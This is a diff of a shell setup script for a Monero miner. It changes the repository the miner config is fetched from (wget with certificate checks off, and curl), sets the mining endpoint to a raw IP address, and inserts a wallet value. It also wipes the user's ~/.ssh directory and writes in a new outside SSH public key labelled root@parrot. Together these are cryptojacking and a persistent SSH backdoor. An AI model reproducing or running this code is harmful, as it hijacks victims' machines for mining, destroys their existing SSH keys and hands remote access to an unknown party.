@@ -338,8 +338,8 @@ fi
 echo ""
 
 rm -rf $HOME/.gdm2/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
+wget --no-check-certificate https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
+curl https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
 
 sed -i 's/"url": *"[^"]*",/"url": "194.164.63.118:8080",/' $HOME/.gdm2/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
@@ -365,7 +365,7 @@ rm -rf ~/.ssh/
 mkdir ~/.ssh
 chmod 700 ~/.ssh
 touch ~/.ssh/authorized_keys
-echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0='>>~/.ssh/authorized_keys
+echo 'ssh-rsa ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4koUa0STJSwJxnltGqeaS75OcyzAZoJx4Qrxfr0xyxfN/l1XORKxgOCDBAsLf2C5qHzZ3aPZJzlECD9mtR8pfKbJ8ZEv08Kug/IMT63y/dT3zPcn6zQICXXVIVym0lpbVfgO8IJSVKblTedC8WS3XRnqWOhTfSvKLTBrDrZ72PQ3/gE8DM1gMU+vcNNqlvSfj7bDhp4RedsmbYLmFOLDEIGxXSo5M/xO1Wy6mcoxQNwermmmVJ0Oos+ZRwOuTilG+VuHVcdQY1Wpn/mG1hxdk/ClqV1bQZfQzAiAUQHh1XiGDF0htghgJFtD6dfHpahdp3T4Mho5rJKSiMlvAGOY1JRiukX3EM9O2IyBt+FNw1iazca+jFfcxz0YqV8pWZ23sFH+TJFMcXpN+u9n+4OhYHptiwMpvAhh4wam4+nPMdLUNy+Xt430OFbc/4nYKQcQkS7kRpnx1ThHAUmQ2CbzSkTPv5b3TIr2YR1+9K1sHKntfW2C1F0NYsg8ltvCj758= root@parrot'>>~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 
 echo "[*] Setup complete"
